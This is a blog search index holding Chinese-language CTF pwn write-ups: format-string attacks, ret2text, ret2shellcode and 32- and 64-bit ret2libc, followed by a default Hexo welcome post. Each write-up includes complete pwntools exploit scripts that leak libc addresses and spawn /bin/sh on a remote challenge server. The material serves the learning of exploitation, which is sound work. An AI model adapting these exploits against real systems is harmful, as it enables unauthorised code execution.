<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>格式化字符串溢出</title>
      <link href="/2025/01/23/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/01/23/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><p><strong>做题思路：</strong></p><p>1.先找偏移量，2.直接构造payload进行栈溢出</p><p><strong>常见题型：</strong></p><p>1.伪随机数，2.直接利用printf函数打印，3.利用fmtstr_payload()函数改写地址</p><p><strong>几种转换说明符：</strong></p><p><strong>%s:</strong>   获取指定变量所对应地址的内容，只不过有零截断。（%2$s：表示栈上第二个空间内容）</p><p><strong>%p：</strong>把指向的内存的值直接输出，并不会作为一个地址去访问指向的东西，可以避免程序崩溃。</p><p><strong>%n：</strong>它会把读取到的值视为一个地址，并把printf已经输出的字符数量写入到这个地址指向的位置。%6$n表示往第六个参数指向的内存中写内容（不输出字符）【核心：写入目标地址的值 = 已经输出的字符数量】</p><p><strong>例题1(非栈上)：</strong></p><p><strong>checksec：</strong></p><p><img src="/../imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-23%20103711.png" alt="屏幕截图 2025-01-23 103711"></p><p><strong>IDA分析：</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">{</span><br><span class="line">  locker();</span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>主函数main没有什么问题，进入locker,</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int locker()</span><br><span class="line">{</span><br><span class="line">  char s[520]; // [esp+0h] [ebp-208h] BYREF</span><br><span class="line"></span><br><span class="line">  fgets(s, 512, stdin);</span><br><span class="line">  imagemagic(s);</span><br><span class="line">  if ( key == 0x2223322 )</span><br><span class="line">    return system("/bin/sh");</span><br><span class="line">  else</span><br><span class="line">    return printf(format, &amp;key, key);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>s是208，fgets却是512，明显用%p泄露格式化字符串地址的偏移，当key的值等于0x2223322，返回system(“/bin/sh”)，跟进imagemagic</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl imagemagic(char *format)</span><br><span class="line">{</span><br><span class="line">  return printf(format);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>存在格式化字符串漏洞，可以使用fmtstr_payload()函数改写key地址使其等于0x2223322</p><p><img src="/../imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-23%20110926.png" alt="屏幕截图 2025-01-23 110926"></p><p>偏移量为12</p><p><strong>Exp：</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=remote('61.147.171.105',53739)</span><br><span class="line"></span><br><span class="line">payload=fmtstr_payload(12,{0x804A048:0x2223322})</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><p><strong>补充fmtstr_payload()函数用法：</strong></p><p>fmtstr_payload(offset, writes, numbwritten=0, write_size=‘byte’)<br>第一个参数表示格式化字符串的偏移；<br>第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成{printfGOT:<br>systemAddress}；本题是将0804a048处改为0x2223322<br>第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；<br>第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。<br>fmtstr_payload函数返回的就是payload</p><p><strong>我们常用的形式是fmtstr_payload(偏移，{原地址：目的地址})</strong></p><p>这个是专门为32位程序格式化字符串漏洞输出payload的一个函数</p><p><strong>例题2：</strong></p><p><strong>checksec:</strong></p><p><img src="/../imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-23%20163020.png" alt="屏幕截图 2025-01-23 163020"></p><p><strong>IDA：</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">{</span><br><span class="line">  _DWORD buf[2]; // [esp+1Eh] [ebp-7Eh] BYREF</span><br><span class="line">  __int16 v5; // [esp+26h] [ebp-76h]</span><br><span class="line">  char s[100]; // [esp+28h] [ebp-74h] BYREF</span><br><span class="line">  unsigned int v7; // [esp+8Ch] [ebp-10h]</span><br><span class="line"></span><br><span class="line">  v7 = __readgsdword(0x14u);</span><br><span class="line">  setbuf(stdin, 0);</span><br><span class="line">  setbuf(stdout, 0);</span><br><span class="line">  setbuf(stderr, 0);</span><br><span class="line">  buf[0] = 0;</span><br><span class="line">  buf[1] = 0;</span><br><span class="line">  v5 = 0;</span><br><span class="line">  memset(s, 0, sizeof(s));</span><br><span class="line">  puts("please tell me your name:");</span><br><span class="line">  read(0, buf, 0xAu);</span><br><span class="line">  puts("leave your message please:");</span><br><span class="line">  fgets(s, 100, stdin);</span><br><span class="line">  printf("hello %s", (const char *)buf);</span><br><span class="line">  puts("your message is:");</span><br><span class="line">  printf(s);    //格式化字符串漏洞</span><br><span class="line">  if ( pwnme == 8 )</span><br><span class="line">  {</span><br><span class="line">    puts("you pwned me, here is your flag:\n");</span><br><span class="line">    system("cat flag");</span><br><span class="line">  }</span><br><span class="line">  else</span><br><span class="line">  {</span><br><span class="line">    puts("Thank you!");</span><br><span class="line">  }</span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>当pwnme=8时，就可以得到flag。存在格式字符串漏洞，那么就可以用%n(打印出来%n之前的字符个数，并且可以赋值给变量)，那么这样不就可以让pwnme == 8了吗</p><p><img src="/../imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-23%20164200.png" alt="屏幕截图 2025-01-23 164200"></p><p>偏移量为10，格式化字符串”%10$n”将已经输出的字符数写入到第十个参数地址。如果第十个参数是ds:pwnme，就可以修改内存地址ds:pwnme的值。pwnme地址为0x804A068.</p><p><strong>Exp:</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote('61.147.171.105',60496)</span><br><span class="line"></span><br><span class="line">p.sendlineafter("please tell me your name:", b"abc")</span><br><span class="line">payload = p32(0x804A068) + b"aaaa" + b"%10$n"         //p32(0x804A068)共4个字节，所以需要再添加4个字节才正好向内存地址写入8</span><br><span class="line">p.recvuntil("leave your message please:")</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><p><strong>x64和x86的区别：</strong></p><p>64为程序会优先将函数的前6个参数放置在寄存器中，超过6个的再存放在栈上，而32位直接存放在栈上。64位程序需要先往寄存器上看，因为格式化字符串作为printf函数的第一个参数，所以理所应当的存放在rdi寄存器中，剩下的RSI、RDX、RCX、R8、R9这5个寄存器会接着存放其他参数。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2textandshellcode</title>
      <link href="/2025/01/19/ret2textandshellcode/"/>
      <url>/2025/01/19/ret2textandshellcode/</url>
      
        <content type="html"><![CDATA[<p><strong>ret2text</strong></p><p><strong>checksec</strong></p><p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20164828.png" alt="屏幕截图 2025-01-19 164828"></p><p>NX保护开启</p><p><strong>IDA分析</strong></p><p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20171625.png" alt="屏幕截图 2025-01-19 171625"></p><p>无异常，进入vuln函数</p><p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20171634.png" alt="屏幕截图 2025-01-19 171634"></p><p>buf存在栈溢出，无其他问题，F12查看</p><p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20172645.png" alt="屏幕截图 2025-01-19 172645"></p><p>发现有system和/bin/sh字符串就好办了，32位程序在运行中栈的结构是：<code>调用函数地址</code> -&gt; <code>函数返回地址</code> -&gt; <code>参数</code>，</p><p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20172901.png" alt="屏幕截图 2025-01-19 172901"><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20172918.png" alt="屏幕截图 2025-01-19 172918"></p><p>构造payload=b’a’*(0x88+0x4)+p32(0x8048320)+p32(1)+p32(0x804A024)；</p><p><strong>exp:</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">p=remote('61.147.171.105',63627)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">payload=b'a'*(0x88+0x4)+p32(0x8048320)+p32(1)+p32(0x804A024)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><p><strong>ret2shellcode</strong></p><p><strong>checksec</strong></p><p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20174236.png" alt="屏幕截图 2025-01-19 174236"></p><p>NX保护开启</p><p><strong>IDA分析</strong></p><p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20174643.png" alt="屏幕截图 2025-01-19 174643"></p><p>主函数main无异常，进入hello函数</p><p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20174652.png" alt="屏幕截图 2025-01-19 174652"></p><p>最后是gets一个s，get就相当于read，s是我们输入的message信息的存储变量，猜测是要把s的地址全打满然后让溢出的内容被get到</p><p>F12查看</p><p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20175519.png" alt="屏幕截图 2025-01-19 175519"></p><p>存在字符串system但并没有/bin/sh字符串</p><p>查看name</p><p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20175718.png" alt="屏幕截图 2025-01-19 175718"></p><p>name处于bss段可以写入字符串/bin/sh,就可以构造payload，payload=b’a’*偏移量+p32(system_add)+p32(0)+p32(name_add)</p><p><strong>Exp:</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r = remote("61.147.171.105",61934)</span><br><span class="line">r.sendline('bin/sh')</span><br><span class="line">payload = b'a'*(0x26+4) + p32(0x08048420) +p32(0) + p32(0x0804A080) </span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure><p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20180140.png" alt="屏幕截图 2025-01-19 180140"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>libc32</title>
      <link href="/2025/01/19/libc32/"/>
      <url>/2025/01/19/libc32/</url>
      
        <content type="html"><![CDATA[<p><strong>checksec</strong></p><p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20124851.png" alt="屏幕截图 2025-01-19 124851"></p><p>可以发现32位，NX保护开启</p><p><strong>IDA分析</strong></p><p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20124932.png" alt="屏幕截图 2025-01-19 124932"></p><p>主函数main中并没有什么问题，进入vuln函数</p><p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20124948.png" alt="屏幕截图 2025-01-19 124948"></p><p>可以发现buf存在栈溢出，shift F12<img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20144947.png" alt="屏幕截图 2025-01-19 144947"></p><p>不存在system和/bin/sh字符串</p><p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-19%20145051.png" alt="屏幕截图 2025-01-19 145051"></p><p>有write函数考虑libc，知道write函数的got表地址，我们就可以利用libc推算出偏移和基址，进而推算system和/bin/sh的got表地址，需要构造两个payload,第一个payload用于获得write函数的got表地址，先用字符填满缓冲区和ebp地址，再使用plt调用write函数用于覆盖返回地址，返回main，返回write的got表地址，再读入4个字节，payload1=b’a’*(0x88+0x4)+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)。</p><p>得到write的got表地址就可以计算libc的基地址，进而根据偏移可以推算出字符串system和/bin/sh的真实地址，构造第二个payload,payload=b’a’*(0x88+0x4)+p32(system)+p32(main)+p32(binsh),先覆盖返回地址，在覆盖system的返回地址，传入system的参数/bin/sh。</p><p>这道题给了libc文件，没有给的要去寻找并下载libc文件。</p><p>最后exp为：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level='debug',arch='i386',os='linux')</span><br><span class="line"></span><br><span class="line">p=remote('61.147.171.105',60501)</span><br><span class="line"></span><br><span class="line">elf=ELF('./level3')</span><br><span class="line">libc=ELF('./libc_32.so.6')</span><br><span class="line"></span><br><span class="line">write_got=elf.got['write']</span><br><span class="line">write_plt=elf.plt['write']</span><br><span class="line">main=elf.symbols['main']</span><br><span class="line"></span><br><span class="line">payload=b'a'*(0x88+0x4)+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)</span><br><span class="line"></span><br><span class="line">p.sendlineafter('Input:\n',payload)</span><br><span class="line"></span><br><span class="line">write_addr=u32(p.recv(4))</span><br><span class="line">libc_base=write_addr-libc.symbols['write']</span><br><span class="line">system=libc_base+libc.symbols['system']</span><br><span class="line">binsh=libc_base+next(libc.search(b"/bin/sh\x00"))</span><br><span class="line"></span><br><span class="line">payload=b'a'*(0x88+0x4)+p32(system)+p32(main)+p32(binsh)</span><br><span class="line"></span><br><span class="line">p.sendlineafter('Input:\n',payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>libc64</title>
      <link href="/2025/01/18/libc64/"/>
      <url>/2025/01/18/libc64/</url>
      
        <content type="html"><![CDATA[<p><strong>checksec</strong></p><p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-16%20114726.png" alt="屏幕截图 2025-01-16 114726"></p><p>NX保护开启</p><p><strong>IDA64分析</strong></p><p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-16%20114845.png" alt="屏幕截图 2025-01-16 114845"></p><p>可以发现main函数没有什么问题，进入echo函数查看</p><p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-16%20114858.png" alt="屏幕截图 2025-01-16 114858"></p><p>可以发现echo函数存在漏洞，s2数组只有16字节，而传入的buf可以为1024字节，存在栈溢出漏洞。</p><p>该函数循环遇到0就会停止，可以构造ROP链。</p><p><strong>解题</strong></p><p>F12查看<img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-16%20114953.png" alt="屏幕截图 2025-01-16 114953"></p><p>没有发现system和/bin/sh，可以通过泄漏puts或read函数真实地址，构造getshell。</p><p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-16%20175133.png" alt="屏幕截图 2025-01-16 175133"></p><p>64位Linux前六个参数是使用rdi,rsi,rdx,rcs,r8,r9传递的，需要构造两个payload，而且要先pop四次，payload1=’a’*0x18+p64(pop_4)+p64(ROP);</p><p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-16%20162420.png" alt="屏幕截图 2025-01-16 162420"></p><p>通过泄露puts和read真实地址寻找libc版本，脚本如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(os = 'linux', arch = 'amd64', log_level = 'debug')</span><br><span class="line"></span><br><span class="line">r = remote('61.147.171.105',63071)</span><br><span class="line">elf = ELF('./7eff')</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt['puts']</span><br><span class="line">puts_got = elf.got['read']</span><br><span class="line">main_addr = elf.symbols['main']</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = 0x4008a3</span><br><span class="line">pop_4 = 0x40089c</span><br><span class="line"></span><br><span class="line">payload = b'a' * (0x18) + p64(pop_4) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">r.sendlineafter('RCTF\n',payload)</span><br><span class="line"></span><br><span class="line">puts_real_addr = u64(r.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))</span><br><span class="line"></span><br><span class="line">print("puts_real_addr:",hex(puts_real_addr))</span><br></pre></td></tr></tbody></table></figure><p>把read改为puts，就可以得到puts的真实地址。read和puts的真实地址是变化的，但后三位是不变的，根据其可以筛选出libc版本，并将其下载。</p><p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-16%20170856.png" alt="屏幕截图 2025-01-16 170856">我们可以通过puts真实地址-偏移得到libc的基地址，从而可以计算出system和/bin/sh,进而构造payload2 = b’a’ * (0x18) + p64(pop_4) + p64(pop_rdi_ret) + p64(binsh_addr)+p64(system_addr)</p><p>最终的exp：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">context(os = 'linux', arch = 'amd64', log_level = 'debug')</span><br><span class="line"></span><br><span class="line">r = remote('61.147.171.105',63071)</span><br><span class="line">elf = ELF('./7eff')</span><br><span class="line">libc = ELF('./libc6_2.23-0ubuntu11_amd64.so')</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt['puts']</span><br><span class="line">puts_got = elf.got['read']</span><br><span class="line">main_addr = elf.symbols['main']</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = 0x4008a3</span><br><span class="line">pop_4 = 0x40089c</span><br><span class="line">#ret = 0x400589</span><br><span class="line"></span><br><span class="line">payload = b'a' * (0x18) + p64(pop_4) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">r.sendlineafter('RCTF\n',payload)</span><br><span class="line"></span><br><span class="line">puts_real_addr = u64(r.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))</span><br><span class="line"></span><br><span class="line">print("puts_real_addr:",hex(puts_real_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_real_addr - libc.symbols['read']</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols['system']</span><br><span class="line">binsh_addr = libc_base + next(libc.search('/bin/sh'))</span><br><span class="line"></span><br><span class="line">payload1 = b'a' * (0x18) + p64(pop_4) + p64(pop_rdi_ret) + p64(binsh_addr)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure><p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-16%20171231.png" alt="屏幕截图 2025-01-16 171231"></p><p><strong>堆栈平衡</strong></p><p>用ROP链找到ret，然后在填充垃圾数据后加上p64(ret)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/01/15/hello-world/"/>
      <url>/2025/01/15/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
